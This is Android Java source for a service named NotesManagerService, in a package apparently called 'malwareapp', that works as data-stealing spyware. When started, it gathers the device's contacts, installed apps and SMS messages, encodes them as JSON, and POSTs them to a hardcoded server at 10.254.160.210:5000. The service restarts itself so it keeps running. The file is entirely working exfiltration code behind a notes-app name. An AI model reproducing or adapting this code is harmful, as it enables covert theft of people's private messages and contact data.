package com.example.malwareapp;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;

import com.example.malwareapp.model.AppInfo;
import com.example.malwareapp.model.ContactsInfo;
import com.example.malwareapp.model.SmsInfo;
import com.example.malwareapp.model.UserInfo;
import com.google.gson.Gson;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

import javax.net.ssl.HttpsURLConnection;

public class NotesManagerService extends Service {

    public NotesManagerService() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        System.out.println("Funciona");

        ServiceDAO dao = new ServiceDAO();
        List<ContactsInfo> contacts = dao.getContactList(getContentResolver());
        List<AppInfo> apps = dao.getInstalledApps(getPackageManager());
        List<SmsInfo> sms = dao.getSms(getContentResolver());

        UserInfo userInfo = new UserInfo(contacts, apps, sms);
        String json = new Gson().toJson(userInfo);
        System.out.println(json);

        CallAPI api = new CallAPI();
        api.execute("http://10.254.160.210:5000/send", "test", json);

        return START_STICKY;
    }


    public class CallAPI extends AsyncTask<String, String, String> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(String... params) {
            String urlString = params[0]; // URL to call
            String paramName = params[1];
            String paramValue = params[2];
            OutputStream out = null;
            String data = paramName + "=" + paramValue;
            byte[] postData = data.getBytes( StandardCharsets.UTF_8 );
            int postDataLength = postData.length;

            try {
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setInstanceFollowRedirects(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setRequestProperty("charset", "utf-8");
                conn.setRequestProperty("Content-Length", Integer.toString(postDataLength));
                conn.setUseCaches(false);
                try (DataOutputStream wr = new DataOutputStream(conn.getOutputStream())) {
                    wr.write(postData);
                }
                conn.getResponseCode();
            }
            catch (IOException e) {
                e.printStackTrace();
            }
            return "";
        }
    }


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}